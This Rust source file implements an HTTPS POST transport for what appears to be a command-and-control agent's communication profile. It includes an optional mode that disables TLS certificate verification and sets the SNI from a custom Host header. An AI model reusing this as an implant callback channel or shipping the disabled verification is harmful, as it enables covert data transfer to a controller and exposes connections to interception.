use std::io::Write;
use std::net::TcpStream;

use agent_utils::{
    debug_invoke,
    errors::{ProfileInternalError, ThanatosError},
};

use super::{HttpRequest, HttpResponse, HttpVerb};

use openssl::ssl::{SslConnector, SslMethod};

impl crate::HttpProfile {
    pub fn send_https(&mut self, data: &str) -> Result<String, ThanatosError> {
        let connection = format!("{}:{}", self.host.trim_start_matches("https://"), self.port);

        let stream = debug_invoke!(
            TcpStream::connect(connection),
            ThanatosError::ProfileError(ProfileInternalError::NoConnection)
        );

        #[cfg(not(feature = "self-signed-certs"))]
        let connector = SslConnector::builder(SslMethod::tls_client())
            .map_err(|_| ThanatosError::ProfileError(ProfileInternalError::Fatal))?
            .build();

        // Please be smart and NOT use self signed certs!
        #[cfg(feature = "self-signed-certs")]
        let connector = {
            use openssl::ssl::SslVerifyMode;

            let mut builder = SslConnector::builder(SslMethod::tls_client())
                .map_err(|_| ThanatosError::ProfileError(ProfileInternalError::Fatal))?;

            builder.set_verify(SslVerifyMode::NONE);
            builder.build()
        };

        // Set the SNI to match the host header if it exists
        let sni = match self.headers.get("Host") {
            Some(host) => host,
            None => self.host.trim_start_matches("https://"),
        };

        let mut stream = debug_invoke!(
            connector.connect(sni, stream),
            ThanatosError::ProfileError(ProfileInternalError::Fatal)
        );

        let req = HttpRequest::new(
            HttpVerb::POST,
            self.host.as_str(),
            config::get_post_uri(),
            &self.headers,
            Some(data),
        )
        .serialize();

        debug_invoke!(
            stream.write_all(&req),
            ThanatosError::ProfileError(ProfileInternalError::Fatal)
        );

        let res = HttpResponse::from_reader(stream).map_err(|e| ThanatosError::ProfileError(e))?;

        if res.status != 200 {
            return Err(ThanatosError::ProfileError(ProfileInternalError::Fatal));
        }

        Ok(res.data)
    }
}
